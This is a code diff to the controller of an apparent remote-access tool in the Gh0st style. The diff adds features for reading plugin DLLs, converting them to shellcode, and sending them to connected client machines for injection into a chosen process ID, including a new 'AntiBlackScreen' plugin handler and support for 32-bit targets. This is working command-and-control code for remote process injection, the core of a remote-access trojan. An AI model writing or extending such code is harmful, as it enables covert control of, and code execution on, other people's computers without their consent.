@@ -53,6 +53,7 @@
 #define TIMER_CHECK 1
 #define TIMER_CLOSEWND 2
 #define TODO_NOTICE MessageBoxA("This feature has not been implemented!\nPlease contact: 962914132@qq.com", "提示", MB_ICONINFORMATION);
+#define TINY_DLL_NAME "TinyRun.dll"
 
 typedef struct {
     const char*   szTitle;     //列表的名称
@@ -101,6 +102,13 @@ std::string EventName()
     snprintf(eventName, sizeof(eventName), "EVENT_%d", GetCurrentProcessId());
     return eventName;
 }
+std::string PluginPath() {
+    char path[_MAX_PATH];
+    GetModuleFileNameA(NULL, path, _MAX_PATH);
+    GET_FILEPATH(path, "Plugins");
+    return path;
+}
+
 
 //////////////////////////////////////////////////////////////////////////
 
@@ -233,7 +241,7 @@ bool IsDll64Bit(BYTE* dllBase)
 }
 
 // 返回：读取的字节数组指针（需要手动释放）
-DllInfo* ReadPluginDll(const std::string& filename)
+DllInfo* ReadPluginDll(const std::string& filename, const DllExecuteInfo & execInfo = { MEMORYDLL, 0, CALLTYPE_IOCPTHREAD })
 {
     // 打开文件（以二进制模式）
     std::ifstream file(filename, std::ios::binary | std::ios::ate);
@@ -255,11 +263,6 @@ DllInfo* ReadPluginDll(const std::string& filename)
         delete[] buffer;
         return nullptr;
     }
-    if (!IsDll64Bit(dllData)) {
-        Mprintf("不支持32位DLL: %s\n", filename.c_str());
-        delete[] buffer;
-        return nullptr;
-    }
     std::string masterHash(GetMasterHash());
     int offset = MemoryFind((char*)dllData, masterHash.c_str(), fileSize, masterHash.length());
     if (offset != -1) {
@@ -271,7 +274,9 @@ DllInfo* ReadPluginDll(const std::string& filename)
 
     // 设置输出参数
     auto md5 = CalcMD5FromBytes(dllData, fileSize);
-    DllExecuteInfo info = { MEMORYDLL, fileSize, CALLTYPE_IOCPTHREAD, };
+    DllExecuteInfo info = execInfo;
+    info.Size = fileSize;
+    info.Is32Bit = !IsDll64Bit(dllData);
     memcpy(info.Name, name.c_str(), name.length());
     memcpy(info.Md5, md5.c_str(), md5.length());
     buffer[0] = CMD_EXECUTE_DLL;
@@ -282,7 +287,7 @@ DllInfo* ReadPluginDll(const std::string& filename)
 }
 
 DllInfo* ReadTinyRunDll(int pid) {
-    std::string name = "TinyRun.dll";
+    std::string name = TINY_DLL_NAME;
     DWORD fileSize = 0;
     BYTE * dllData = ReadResource(IDR_TINYRUN_X64, fileSize);
 	// 设置输出参数
@@ -477,6 +482,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_MESSAGE(WM_SHOWMESSAGE, OnShowMessage)
     ON_MESSAGE(WM_SHOWERRORMSG, OnShowErrMessage)
     ON_MESSAGE(WM_INJECT_SHELLCODE, InjectShellcode)
+    ON_MESSAGE(WM_ANTI_BLACKSCREEN, AntiBlackScreen)
     ON_MESSAGE(WM_SHARE_CLIENT, ShareClient)
     ON_MESSAGE(WM_ASSIGN_CLIENT, AssignClient)
     ON_MESSAGE(WM_ASSIGN_ALLCLIENT, AssignAllClient)
@@ -2224,7 +2230,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     }
     case CMD_EXECUTE_DLL: { // 请求DLL（执行代码）【L】
         DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
-        if (std::string(info->Name) == "TinyRun.dll") {
+        if (std::string(info->Name) == TINY_DLL_NAME) {
 			auto tinyRun = ReadTinyRunDll(info->Pid);
 			Buffer* buf = tinyRun->Data;
             ContextObject->Send2Client(buf->Buf(), tinyRun->Data->length());
@@ -2238,6 +2244,12 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
                 ContextObject->Send2Client(dll->Data->Buf(), dll->Data->length());
                 break;
             }
+        }
+		auto dll = ReadPluginDll(PluginPath() + "\\" + info->Name, { SHELLCODE, 0, CALLTYPE_DEFAULT, {}, {}, info->Pid, info->Is32Bit });
+        if (dll) {
+            Buffer* buf = dll->Data;
+            ContextObject->Send2Client(buf->Buf(), dll->Data->length());
+            SAFE_DELETE(dll);
         }
         Sleep(20);
         break;
@@ -3841,7 +3853,7 @@ context* CMy2015RemoteDlg::FindHostByIP(const std::string& ip) {
 	EnterCriticalSection(&m_cs);
 	for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
 		context* ContextObject = *i;
-        if (ContextObject->GetClientData(ONLINELIST_IP) == clientIP) {
+        if (ContextObject->GetClientData(ONLINELIST_IP) == clientIP || ContextObject->GetAdditionalData(RES_CLIENT_PUBIP) == clientIP) {
             LeaveCriticalSection(&m_cs);
 			return ContextObject;
         }
@@ -3860,10 +3872,36 @@ LRESULT CMy2015RemoteDlg::InjectShellcode(WPARAM wParam, LPARAM lParam){
 
 void CMy2015RemoteDlg::InjectTinyRunDll(const std::string& ip, int pid){
 	auto ctx = FindHostByIP(ip);
-	if (ctx == NULL)return;
+    if (ctx == NULL) {
+        MessageBoxA(CString("没有找到在线主机: ") + ip.c_str(), "提示", MB_ICONINFORMATION);
+        return;
+    }
 
     auto tinyRun = ReadTinyRunDll(pid);
 	Buffer* buf = tinyRun->Data;
 	ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
     SAFE_DELETE(tinyRun);
+}
+
+LRESULT CMy2015RemoteDlg::AntiBlackScreen(WPARAM wParam, LPARAM lParam) {
+	char* ip = (char*)wParam;
+    std::string host(ip);
+    std::string arch = ip + 256;
+	int pid = lParam;
+	auto ctx = FindHostByIP(ip);
+    delete ip;
+    if (ctx == NULL) {
+        MessageBoxA(CString("没有找到在线主机: ") + host.c_str(), "提示", MB_ICONINFORMATION);
+        return S_FALSE;
+    }
+    bool is32Bit = arch == "x86";
+    std::string path = PluginPath() + "\\" + (is32Bit ? "AntiBlackScreen_x86.dll" : "AntiBlackScreen_x64.dll");
+    auto antiBlackScreen = ReadPluginDll(path, { SHELLCODE, 0, CALLTYPE_DEFAULT, {}, {}, pid, is32Bit });
+    if (antiBlackScreen) {
+        Buffer* buf = antiBlackScreen->Data;
+        ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
+        SAFE_DELETE(antiBlackScreen);
+    }else
+        MessageBoxA(CString("没有反黑屏插件: ") + path.c_str(), "提示", MB_ICONINFORMATION);
+    return S_OK;
 }
